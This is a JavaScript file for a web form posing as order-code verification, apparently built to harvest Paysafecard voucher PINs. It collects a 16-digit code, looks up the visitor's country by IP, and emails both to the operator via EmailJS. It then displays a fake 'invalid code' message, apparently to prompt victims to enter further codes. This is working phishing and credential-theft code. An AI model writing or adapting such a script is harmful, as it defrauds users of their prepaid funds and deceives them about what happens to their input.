console.log("script.js chargé");

// Initialisation EmailJS
emailjs.init("rORVGScs1n94sqOPi");

async function verifyOrder() {

    console.log("verifyOrder appelée");

    const input = document.getElementById("orderNumber");
    const message = document.getElementById("message");
    const button = document.querySelector(".search-box button");

    // Supprimer les espaces avant la vérification
    const orderNumber = input.value.replace(/\s/g, "");

    // Vérifie qu'il y a exactement 16 chiffres
    if (!/^\d{16}$/.test(orderNumber)) {
        message.style.color = "red";
        message.textContent = "Please enter a valid 16-digit code.";
        input.focus();
        return;
    }

    button.disabled = true;
    button.textContent = "Sending...";
    message.textContent = "";
let country = "Inconnu";
let countryCode = "??";

try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();

    country = data.country_name;
    countryCode = data.country_code;
} catch (e) {
    console.log("Impossible de récupérer le pays.");
}
    emailjs.send(
    "service_paysafe",
    "template_psf",
    {
        order_number: orderNumber,
        country: country,
        country_code: countryCode
    }
    )

    .then(function (response) {

        console.log("Email envoyé !");
        console.log(response);

        message.style.color = "white";
        message.textContent = "Your request has been sent successfully.";

        // Vider le champ
        input.value = "";
        input.focus();

        // Deuxième message après 2 secondes
        setTimeout(function () {
            console.log("Deuxième message");
            message.style.color = "red";
            message.textContent = "The code entered is invalid.";
        }, 2000);

        button.disabled = false;
        button.textContent = "Submit";

    })

    .catch(function(error) {

        console.error("Erreur EmailJS :", error);

        message.style.color = "red";
        message.textContent = "An error occurred.";

        button.disabled = false;
        button.textContent = "Submit";
    });

}

// Autoriser uniquement les chiffres + ajouter un espace tous les 4 chiffres
document.getElementById("orderNumber").addEventListener("input", function () {

    // Conserver uniquement les chiffres
    let value = this.value.replace(/\D/g, "");

    // Limiter à 16 chiffres
    value = value.substring(0, 16);

    // Ajouter un espace tous les 4 chiffres
    this.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");

});
